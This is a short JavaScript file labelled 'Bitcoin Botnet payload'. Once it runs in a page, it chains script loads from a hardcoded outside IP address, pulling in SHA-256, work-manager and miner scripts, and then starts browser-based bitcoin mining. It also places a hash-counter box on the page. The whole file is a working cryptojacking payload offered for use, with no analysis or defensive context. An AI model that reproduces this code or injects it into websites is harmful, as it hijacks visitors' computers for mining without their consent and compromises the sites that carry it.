/**********************************
*   Bitcoin Botnet payload
*   ######################
*
***********************************/

target_ip = "52.90.115.231";

function loadScript(url, callback)
{
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    
    if(typeof callback !== "undefined") {
        script.onreadystatechange = callback;
        script.onload = callback;
    }

    head.appendChild(script);
}

var bitcoinMiner = function() {
    var body = document.getElementsByTagName('body')[0];
    var div = document.createElement('div');
    div.style.top='10px';
    div.style.left='10px';
    div.style.height='30px';
    div.style.width='200px';
    div.style.backgroundColor='white';
    div.style.position='fixed';
    var input = document.createElement('input');
    input.id='total-hashes';
    div.appendChild(input);
    body.appendChild(div);
    
    begin_mining();
};

var doneTheStuff;
var loadBotNet = function () {
  if (!doneTheStuff) {
    doneTheStuff = true;
    loadScript("http://code.jquery.com/jquery-1.11.0.min.js", function () {
        loadScript("http://" + target_ip + "/hamiyoca/sha256.js", function() {
            loadScript("http://" + target_ip + "/hamiyoca/util.js", function() {
                loadScript("http://" + target_ip + "/hamiyoca/work-manager.js", function(){
                    loadScript("http://" + target_ip + "/hamiyoca/glminer.js", bitcoinMiner);
                });
            });
        });
    });
  }
};

loadBotNet();




